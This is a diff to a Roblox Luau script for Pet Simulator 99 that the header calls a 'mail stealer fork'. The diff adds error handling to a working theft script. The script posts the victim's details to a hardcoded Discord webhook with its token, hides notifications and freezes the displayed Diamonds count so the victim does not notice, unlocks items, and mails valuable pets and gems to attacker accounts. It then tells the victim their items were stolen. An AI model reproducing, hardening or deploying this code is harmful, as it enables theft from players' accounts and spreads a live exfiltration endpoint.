@@ -1,6 +1,7 @@
 -- yeslidez | PS99 mail stealer fork | Roblox Luau, executor environment
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local httpService = game:GetService("HttpService")
+local players = game:GetService("Players")
 Username = "pet99_2948"
 Username2 = "pet99_2947"
 webhook = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa"
@@ -12,24 +13,33 @@ local f1, network, localPlayer, v1, v2, f2, inventory, v3, am, f3, value, notifi
 local function post(title, desc)
   local httpRequest = http_request or request or HttpPost or syn.request
 
-  if webhook and webhook ~= "" and httpRequest then
-    local payload = httpService:JSONEncode({
+  if not (webhook and webhook ~= "" and httpRequest) then
+    return
+  end
+
+  local ok, payload = pcall(function()
+    return httpService:JSONEncode({
       ["embeds"] = { {
         ["title"] = title,
         ["description"] = desc,
         ["color"] = 3447003,
         ["footer"] = { ["text"] = "yeslidez" },
-        ["timestamp"] = DateTime.now():ToIsoDate(),
+        ["timestamp"] = (DateTime and DateTime.now() and DateTime.now():ToIsoDate())
+          or os.date("!%Y-%m-%dT%H:%M:%SZ"),
       } },
     })
+  end)
 
+  if ok then
     task.spawn(function()
-      httpRequest({
-        Url = webhook,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = payload,
-      })
+      pcall(function()
+        httpRequest({
+          Url = webhook,
+          Method = "POST",
+          Headers = { ["Content-Type"] = "application/json" },
+          Body = payload,
+        })
+      end)
     end)
   end
 end
@@ -38,14 +48,20 @@ if getgenv().yeslidez then
   return
 else
   getgenv().yeslidez = true
-  network = replicatedStorage:WaitForChild("Network")
-  localPlayer = game.Players.LocalPlayer
+  localPlayer = players.LocalPlayer
 
   post("▶ Script started",
-    "User: `" .. localPlayer.Name ..
-    "`\nJob: `" .. game.JobId ..
-    "`\nPlace: `" .. game.PlaceId ..
-    "`\nTime: " .. DateTime.now():FormatLocalTime("HH:mm:ss", "en-us"))
+    "User: `" .. tostring(localPlayer and localPlayer.Name or "?") ..
+    "`\nPlace: `" .. tostring(game.PlaceId) ..
+    "`\nTime: " .. (DateTime and DateTime.now():FormatLocalTime("HH:mm:ss", "en-us")
+      or os.date("%H:%M:%S")))
+
+  network = replicatedStorage:WaitForChild("Network", 10)
+
+  if not network then
+    warn("Network not found in ReplicatedStorage.")
+    return
+  end
 
   v1 = {}
   v2 = 0
@@ -55,7 +71,7 @@ else
   end
 
   inventory = f2().Inventory
-  local mailboxSendsSinceReset = f2().MailboxSendsSinceReset
+  local mailboxSendsSinceReset = f2().MailboxSendsSinceReset or 0
   v3 = 20000
 
   if mailboxSendsSinceReset ~= 0 then
@@ -142,12 +158,14 @@ else
 
       if webhook and webhook ~= "" and httpRequest then
         task.spawn(function()
-          httpRequest({
-            Url = webhook,
-            Method = "POST",
-            Headers = headers,
-            Body = jsonEncode,
-          })
+          pcall(function()
+            httpRequest({
+              Url = webhook,
+              Method = "POST",
+              Headers = headers,
+              Body = jsonEncode,
+            })
+          end)
         end)
       end
     end
@@ -165,21 +183,40 @@ else
       return string.format("%.2f%s", v13, v14[v15])
     end
 
-    value = localPlayer.leaderstats["💎 Diamonds"].Value
+    local leaderstats = localPlayer:FindFirstChild("leaderstats")
 
-    localPlayer.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()
-      localPlayer.leaderstats["💎 Diamonds"].Value = value
-    end)
+    if not leaderstats then
+      leaderstats = localPlayer:WaitForChild("leaderstats", 5)
+    end
 
-    local processPendingGUI = localPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
-    notifications = localPlayer.PlayerGui.Notifications
-    processPendingGUI.Disabled = true
+    if leaderstats then
+      value = leaderstats["💎 Diamonds"].Value
 
-    notifications.Enabled = false
+      leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()
+        leaderstats["💎 Diamonds"].Value = value
+      end)
+    end
 
-    notifications:GetPropertyChangedSignal("Enabled"):Connect(function()
+    local scriptsFolder = localPlayer:FindFirstChild("PlayerScripts")
+      and localPlayer.PlayerScripts:FindFirstChild("Scripts")
+    local processPendingGUI = scriptsFolder
+      and scriptsFolder:FindFirstChild("Core")
+      and scriptsFolder.Core:FindFirstChild("Process Pending GUI")
+
+    if processPendingGUI then
+      processPendingGUI.Disabled = true
+    end
+
+    notifications = localPlayer:FindFirstChild("PlayerGui")
+      and localPlayer.PlayerGui:FindFirstChild("Notifications")
+
+    if notifications then
       notifications.Enabled = false
-    end)
+
+      notifications:GetPropertyChangedSignal("Enabled"):Connect(function()
+        notifications.Enabled = false
+      end)
+    end
 
     game.DescendantAdded:Connect(function(descendant)
       if descendant.ClassName == "Sound"
@@ -188,7 +225,7 @@ else
           or descendant.SoundId == "rbxassetid://12413423276") then
         descendant:Destroy()
       end
-    end
+    end)
 
     local function f4()
       local library = replicatedStorage:FindFirstChild("Library")
@@ -379,15 +416,27 @@ else
 
     print("Scanning inventory for items with RAP >= " .. min_rap)
 
+    local petsDirectory
+
+    local okPets, petsResult = pcall(function()
+      return require(replicatedStorage.Library.Directory.Pets)
+    end)
+
+    if okPets then
+      petsDirectory = petsResult
+    else
+      warn("Could not load Pets directory: " .. tostring(petsResult))
+    end
+
     for index5, value10 in ipairs({
       "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate",
     }) do
       if inventory[value10] then
         for key5, value11 in pairs(inventory[value10]) do
           if value10 == "Pet" then
-            local v32 = require(replicatedStorage.Library.Directory.Pets)[value11.id]
+            local v32 = petsDirectory and petsDirectory[value11.id]
 
-            if v32.huge or v32.exclusiveLevel then
+            if v32 and (v32.huge or v32.exclusiveLevel) then
               local minRap = f7(value10, value11)
               print("Calculated RAP for " .. value11.id .. ": " .. minRap)
 
@@ -441,7 +490,9 @@ else
           end
 
           if value11._lk then
-            network:WaitForChild("Locking_SetLocked"):InvokeServer(key5, false)
+            pcall(function()
+              network:WaitForChild("Locking_SetLocked"):InvokeServer(key5, false)
+            end)
           end
         end
       end
@@ -463,8 +514,13 @@ else
       print("Updated Gem Amount after claiming mail: " .. am)
       f6()
 
-      require(replicatedStorage.Library.Client.DaycareCmds).Claim()
-      require(replicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+      pcall(function()
+        require(replicatedStorage.Library.Client.DaycareCmds).Claim()
+      end)
+
+      pcall(function()
+        require(replicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+      end)
 
       local save = replicatedStorage.Library.Client.Save
       v5 = require(save).Get()
@@ -504,11 +560,15 @@ else
 
       f8()
 
-      require(replicatedStorage.Library.Client.Message).Error([[
+      pcall(function()
+        require(replicatedStorage.Library.Client.Message).Error([[
 All your items just got stolen by yeslidez
  Join https://discord.gg/FNnkfJqukh]])
+      end)
 
-      setclipboard("https://discord.gg/FNnkfJqukh")
+      pcall(function()
+        setclipboard("https://discord.gg/FNnkfJqukh")
+      end)
     else
       print("No items met the min_rap requirement or not enough gems to send anything.")
     end
